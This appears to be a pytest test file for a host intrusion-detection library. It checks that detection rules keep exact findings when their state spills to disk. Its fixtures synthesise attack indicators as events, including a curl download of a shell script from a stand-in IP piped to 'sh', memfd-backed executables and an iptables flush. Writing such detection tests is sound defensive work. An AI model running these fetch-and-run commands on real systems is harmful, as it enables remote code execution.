"""Mission-scale state of the host aggregates: per-key state lives in keyed stores and lists that spill to disk and
read back exactly (a tiny hot set gives the same findings as an unbounded one), citations are ids once staged, and
only a disk budget refuses a record, which coverage reports and does not count as evaluated."""
from datetime import UTC, datetime, timedelta

import pytest

from romulus.detect import host
from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv

T0 = datetime(2024, 11, 4, 0, 0, tzinfo=UTC)
_n = 0


def ev(family, ts, outcome=Outcome.success, host_name="web1", **fields):
    global _n
    _n += 1
    return TypedEvent(id=f"b{_n:09d}", family=family, ts=ts, host=host_name, outcome=outcome,
                      fields={k.replace("__", "."): fv(v, f"b{_n}:{k}") for k, v in fields.items()},
                      raw=[RawRef(target="host-x", native_id=f"b{_n}", digest="d")], normalizer="test@1")


def staged_run(cls, partitions, directory, *, hot=None, monkeypatch=None, budgets=None):
    """Run a staged rule the way the sweep does: drain the stage after every partition, then finalize with a
    loader. Returns (rule, findings, the records each partition staged)."""
    if hot is not None:
        monkeypatch.setattr(cls, "HOT", hot)
    rule = cls()
    rule.spill_dir = directory
    for name, budget in (budgets or {}).items():
        getattr(rule, name).disk_budget = budget
    stage, out = {}, []
    for part in partitions:
        out += rule.consume(list(part))
        stage.update({e.id: e for e in rule.drain_staged()})
    rule.bind_loader(lambda ids: [stage[i] for i in ids if i in stage])
    return rule, out + rule.finalize()


def shape(out):
    return sorted((m.group_key, m.claim, m.proposed_lane, m.severity, m.notes, sorted(e.id for e in m.events),
                   [(p.field, p.value) for p in m.predicate]) for m in out)


def same_small_and_unbounded(cls, parts, tmp_path, monkeypatch, store):
    small, small_out = staged_run(cls, parts, tmp_path / "small", hot=2, monkeypatch=monkeypatch)
    assert getattr(small, store).on_disk > 0, "the hot set must have spilled for the comparison to mean anything"
    _big, big_out = staged_run(cls, parts, tmp_path / "big", hot=10**6, monkeypatch=monkeypatch)
    assert small_out and shape(small_out) == shape(big_out)
    assert small.capped == 0 and small.limit_reasons() == []
    return small, small_out


# ---------------------------------------------------------------- web service interpreter shapes
def web(ts, host_name="web1", command="/usr/bin/zmc -m 1"):
    return ev("process_exec", ts, host_name=host_name, process__user="www-data",
              process__argv=["/bin/sh", "-c", command], process__executable="/bin/dash")


def test_web_shapes_spill_and_read_back_exactly(tmp_path, monkeypatch):
    """Routine, burst and rare shapes on 30 hosts, read hour by hour with a hot set of two shapes."""
    parts = []
    for hour in range(8):
        part = []
        for h in range(30):
            if h % 3 == 0:                   # a schedule: two runs every hour
                part += [web(T0 + timedelta(hours=hour, minutes=m), f"h{h}") for m in (5, 35)]
            elif h % 3 == 1 and hour == 2:   # a burst: twelve runs in one hour
                part += [web(T0 + timedelta(hours=hour, minutes=m), f"h{h}") for m in range(12)]
            elif h % 3 == 2 and hour == 4:   # rare: one run
                part.append(web(T0 + timedelta(hours=hour), f"h{h}"))
        parts.append(part)
    _small, out = same_small_and_unbounded(host.WebServiceSpawnsInterpreter, parts, tmp_path, monkeypatch, "shapes")
    lanes = sorted(m.proposed_lane for m in out)
    assert lanes == ["context"] * 10 + ["lead"] * 20      # routine; bursts and rare runs (no typed indicator)


def test_a_late_hour_is_counted_once_and_a_burst_is_not_turned_routine(tmp_path, monkeypatch):
    """Three runs at 00:00 and one at 05:00 are read from one target; two more 00:00 runs come from a target read
    later. The shape ran in two distinct hours, five of its six runs in one: a repeated shape (lead). Counting the
    late hour again would make it three hours with a busiest hour of three, which is routine (context)."""
    first = [web(T0 + timedelta(minutes=m)) for m in (1, 2, 3)] + [web(T0 + timedelta(hours=5))]
    late = [web(T0 + timedelta(minutes=m)) for m in (4, 5)]
    rule, out = staged_run(host.WebServiceSpawnsInterpreter, [first, late], tmp_path, hot=1, monkeypatch=monkeypatch)
    [m] = out
    assert m.proposed_lane == "lead" and "Repeated shape" in m.claim and "6 times" in m.claim
    assert rule.limit_reasons() == []
    state = rule.shapes.peek(("web1", "www-data", m.claim.split("executed '")[1].split("'")[0], None))
    assert state[2] == {T0: 5, T0 + timedelta(hours=5): 1}


@pytest.mark.slow
def test_web_shape_run_every_five_minutes_for_three_weeks_stays_routine(tmp_path, monkeypatch):
    batches = [[web(T0 + timedelta(hours=hour, minutes=5 * k)) for k in range(12)] for hour in range(24 * 21)]
    rule, out = staged_run(host.WebServiceSpawnsInterpreter, batches, tmp_path, hot=1, monkeypatch=monkeypatch)
    [m] = out
    assert m.proposed_lane == "context" and f"{12 * 24 * 21} times" in m.claim
    assert f"spread across {24 * 21} distinct hours" in m.claim
    assert rule.retained_events() == []


def test_a_run_of_a_shape_the_budget_cannot_hold_is_a_lead_per_shape(tmp_path, monkeypatch):
    parts = [[web(T0, f"h{h}") for h in range(5)], [web(T0 + timedelta(hours=1), f"g{h}") for h in range(4)]
             + [web(T0 + timedelta(hours=1, minutes=1), "g0")]]
    rule, out = staged_run(host.WebServiceSpawnsInterpreter, parts, tmp_path, hot=1, monkeypatch=monkeypatch,
                           budgets={"shapes": 1})
    unheld = [m for m in out if m.group_key.endswith("|unheld")]
    # one lead per new shape (a second run of it adds nothing), nothing refused
    assert len(out) == 9 and len(unheld) == 4 and rule.capped == 0 and rule.evaluated == 10
    assert all(m.proposed_lane == "lead" and any("rarity was not judged" in n for n in m.notes) for m in unheld)
    assert any("published as a lead without its count" in r for r in rule.limit_reasons())


# ---------------------------------------------------------------- external ssh logins
def login(ts, ip="203.0.113.9", user="root", host_name="web1"):
    return ev("auth", ts, host_name=host_name, auth__service="sshd", auth__phase="authentication", source__ip=ip,
              user__name=user)


def test_external_ssh_login_groups_spill_and_read_back_exactly(tmp_path, monkeypatch):
    parts = [[login(T0 + timedelta(minutes=p, seconds=i), ip=f"203.0.113.{i}") for i in range(1, 40)]
             for p in range(30)]
    _rule, out = same_small_and_unbounded(host.SshLoginFromExternal, parts, tmp_path, monkeypatch, "groups")
    assert len(out) == 39 and all("At least 30 successful SSH login(s)" in m.claim for m in out)
    assert all(len(m.events) == 21 for m in out)        # the first twenty, and the one ending the span


def test_external_ssh_logins_hold_twenty_citations_and_exact_counts(tmp_path, monkeypatch):
    logins = [login(T0 + timedelta(minutes=i)) for i in range(500)]
    rule, [m] = staged_run(host.SshLoginFromExternal, [logins[:250], logins[250:]], tmp_path, hot=1,
                           monkeypatch=monkeypatch)
    assert len(m.events) == 21 and "At least 500 successful SSH login(s)" in m.claim
    assert "21 of the 500 records are cited, including the first and the last." in m.claim
    assert (T0 + timedelta(minutes=499)).isoformat() in m.claim
    assert all(item[1] is None for _key, state in rule.groups.items() for item in state[3].items)


def test_external_ssh_login_of_a_refused_group_is_published_on_its_own(tmp_path, monkeypatch):
    parts = [[login(T0, ip=f"203.0.113.{i}") for i in range(1, 4)],
             [login(T0 + timedelta(minutes=1), ip=f"198.51.100.{i}") for i in range(1, 4)]]
    rule, out = staged_run(host.SshLoginFromExternal, parts, tmp_path, hot=1, monkeypatch=monkeypatch,
                           budgets={"groups": 1})
    alone = [m for m in out if m.group_key.endswith("|unheld")]
    assert len(out) == 6 and len(alone) == 3 and rule.capped == 0 and rule.evaluated == 6
    assert all("At least 1 successful SSH login(s)" in m.claim and m.events for m in alone)
    assert any("published one at a time" in r for r in rule.limit_reasons())


# ---------------------------------------------------------------- unbacked executables
def memfd(ts, i, host_name="web1"):
    return ev("process_exec", ts, host_name=host_name, process__executable=f"/memfd:x{i} (deleted)",
              process__pid=1000 + i, process__uid=str(i % 3))


def test_unbacked_executable_groups_spill_and_read_back_exactly(tmp_path, monkeypatch):
    parts = [[memfd(T0 + timedelta(minutes=p, seconds=i), i) for i in range(40)] for p in range(12)]
    _rule, out = same_small_and_unbounded(host.UnbackedExecutable, parts, tmp_path, monkeypatch, "groups")
    # the first ten records and the one that ends the span
    assert len(out) == 40 and all("12 audit record(s)" in m.claim and len(m.events) == 11 for m in out)
    assert all("11 of the 12 records are cited, including the first and the last." in m.claim for m in out)


def test_unbacked_executable_record_of_a_refused_group_is_published_on_its_own(tmp_path, monkeypatch):
    parts = [[memfd(T0, i) for i in range(3)], [memfd(T0 + timedelta(minutes=1), i) for i in range(3, 7)]]
    rule, out = staged_run(host.UnbackedExecutable, parts, tmp_path, hot=1, monkeypatch=monkeypatch,
                           budgets={"groups": 1})
    alone = [m for m in out if m.group_key.endswith("|unheld")]
    assert len(out) == 7 and len(alone) == 4 and rule.capped == 0 and rule.evaluated == 7
    assert all("1 audit record(s)" in m.claim for m in alone)
    assert any("published one at a time" in r for r in rule.limit_reasons())


# ---------------------------------------------------------------- downloader feeds interpreter
def pair(ts, ppid, url="http://198.51.100.7/a.sh", host_name="web1"):
    return (ev("process_exec", ts, host_name=host_name, process__argv=["curl", url], process__ppid=ppid,
               process__executable="/usr/bin/curl"),
            ev("process_exec", ts + timedelta(seconds=1), host_name=host_name, process__argv=["sh"],
               process__ppid=ppid, process__executable="/bin/dash"))


def test_downloader_pairs_spill_and_read_back_exactly(tmp_path, monkeypatch):
    """Pairs on 20 hosts every ten minutes for five hours; every other pair is split across a partition boundary."""
    parts, carry = [], []
    for p in range(30):
        part = list(carry)
        carry = []
        for h in range(20):
            downloader, interpreter = pair(T0 + timedelta(minutes=10 * p, seconds=h), 100 + p, host_name=f"h{h}")
            part.append(downloader)
            (carry if h % 2 else part).append(interpreter)
        parts.append(part)
    parts.append(carry)
    _rule, out = same_small_and_unbounded(host.DownloaderFeedsInterpreter, parts, tmp_path, monkeypatch, "found")
    assert len(out) == 20 and all("occurred 30 times" in m.claim and "regular" in m.claim for m in out)


def test_downloader_pair_refused_by_the_budget_is_published_on_its_own(tmp_path, monkeypatch):
    parts = [[*pair(T0, 100), *pair(T0, 101, host_name="web2"), *pair(T0, 102, host_name="web3")],
             [*pair(T0 + timedelta(minutes=5), 103), *pair(T0 + timedelta(minutes=5), 104, host_name="web4")]]
    rule, out = staged_run(host.DownloaderFeedsInterpreter, parts, tmp_path, hot=1, monkeypatch=monkeypatch,
                           budgets={"found": 1})
    alone = [m for m in out if m.group_key.endswith("|unheld")]
    assert len(out) == 5 and len(alone) == 2 and rule.capped == 0
    assert all(m.proposed_lane == "urgent" and len(m.events) == 2 for m in alone)    # both execs in the batch
    assert any("published one at a time" in r for r in rule.limit_reasons())


# ---------------------------------------------------------------- firewall
def block(ts, i, host_name="web1"):
    return ev("process_exec", ts, host_name=host_name, process__executable="/usr/sbin/iptables",
              process__argv=["iptables", "-A", "INPUT", "-s", f"198.51.100.{i}", "-j", "DROP"])


def test_firewall_direct_changes_spill_and_read_back_exactly(tmp_path, monkeypatch):
    parts = [[block(T0 + timedelta(minutes=p, seconds=i), i) for i in range(1, 30)] for p in range(5)]
    parts.append([ev("process_exec", T0 + timedelta(hours=1), process__executable="/usr/sbin/iptables",
                     process__argv=["iptables", "-F"])])
    _rule, out = same_small_and_unbounded(host.FirewallRuleChange, parts, tmp_path, monkeypatch, "direct")
    assert len(out) == 5 * 29 + 1


def test_firewall_direct_change_refused_by_the_budget_is_published_on_its_own(tmp_path, monkeypatch):
    parts = [[block(T0, i) for i in range(1, 4)], [block(T0 + timedelta(minutes=1), i) for i in range(4, 6)]]
    rule, out = staged_run(host.FirewallRuleChange, parts, tmp_path, hot=1, monkeypatch=monkeypatch,
                           budgets={"direct": 1})
    alone = [m for m in out if m.group_key.endswith("|unheld")]
    assert len(out) == 5 and len(alone) == 2 and rule.capped == 0
    assert any("published as they are read" in r for r in rule.limit_reasons())
